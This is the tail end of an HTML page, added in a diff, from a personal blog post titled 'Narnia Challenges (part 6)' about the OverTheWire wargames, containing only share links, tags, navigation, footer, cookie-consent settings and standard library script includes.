+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://noopz.github.io/narnia_challenges_part6/" data-title="Narnia Challenges (part 6)" data-hashtags="OTW,narnia,wargames"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://noopz.github.io/narnia_challenges_part6/" data-hashtag="OTW"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/otw/">OTW</a>,&nbsp;<a href="/tags/narnia/">narnia</a>,&nbsp;<a href="/tags/wargames/">wargames</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/narnia_challenges_part5/" class="prev" rel="prev" title="Narnia Challenges (part 5)"><i class="fas fa-angle-left fa-fw"></i>Narnia Challenges (part 5)</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Zack</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">cc by-nc 4.0</a></span><br><span class="asdf">&nbsp;<a href="/privacy" target="">Privacy Policy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{},"cookieconsent":{"content":{"allow":"Allow cookies","deny":"Decline","dismiss":"Allow cookies","link":"Learn more","message":"This website uses cookies to ensure you get the best experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"revokable":false,"theme":"edgeless","type":"info"},"gtagConfig":{"anonymize_ip":true,"enable":true,"tracking_id":"UA-168052344-1"}};</script><script type="text/javascript" src="/js/theme.min.cb3f77989212bebcd498d8b441c555574e00a1a1250508a430cf215c9f45bef736e721d5005ef144b47b2cd3997c2175c03977c50086fe4016eab32a8fe118b6.js" integrity="sha512-yz93mJISvrzUmNi0QcVVV04AoaElBQikMM8hXJ9Fvvc25yHVAF7xRLR7LNOZfCF1wDl3xQCG/kAW6rMqj&#43;EYtg=="></script>
+</body>
+</html>
